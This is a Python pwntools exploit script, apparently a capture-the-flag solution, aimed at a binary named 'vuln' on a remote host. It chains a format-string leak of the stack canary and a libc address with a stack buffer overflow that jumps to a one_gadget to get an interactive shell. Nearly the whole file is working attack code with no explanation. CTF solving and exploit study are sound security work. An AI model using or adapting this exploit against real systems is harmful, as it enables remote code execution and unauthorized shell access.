from pwn import *

HOST = "jota.jointsugm.id"
PORT = "8671"

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (brea kpoints etc)
gdbscript = """
init-pwndbg
c
""".format(
    **locals()
)

# Binary filename
exe = "./vuln"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc6_2.27-3ubuntu1.5_amd64.so")
# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
# ld = ELF("./ld-2.27.so")

# Start program
io = start()

offset = 1

def receive():
    io.recvuntil(b"[4] Exit")


def send(text):
    try:
        text = text.encode()
    except:
        pass
    io.sendline(text)


def pay_bills(t1, t2):
    send("3")

    arr = []
    io.sendlineafter(b"name?", t1)
    io.recvuntil("~")
    leak = io.recvuntil("~", drop=True)
    arr.append(leak)

    io.sendlineafter(b"pay?", t2)
    io.recvuntil("~")
    leak = io.recvuntil("~", drop=True)
    arr.append(leak)

    io.sendlineafter(b"for us?", b"a")

    return arr


arr = []

receive()
send("1")
send("AAAA")
send("2")
send("BBBB")
send("y")
receive()

# for i in range(100):
#     pay_bills()

# for i in range(0, 100, 2):
#   t1 = f"~%{i+1}$p~".encode()
#   t2 = f"~%{i+2}$p~".encode()
#   arr = arr + pay_bills(t1, t2)

# for idx, val in enumerate(arr):
#     print(id, val)

t1 = f"~%{41}$p~".encode()
t2 = f"~%{43}$p~".encode()
arr = arr + pay_bills(t1, t2)


CANARY = int(arr[0], 16)
__libc_start_main_ret = int(arr[1], 16)

# offset = 0x21c87

info("CANARY: " + hex(CANARY))
info("LIBC: " + hex(__libc_start_main_ret))

libc.address = __libc_start_main_ret - 0x21C87

offset = 200
send("3")
send("a")
send("b")
payload = flat({offset: [p64(CANARY), b"A" * 8, p64(libc.address + 0x4F2A5)]})
print(payload)
send(payload)

# Got Shell?
io.interactive()
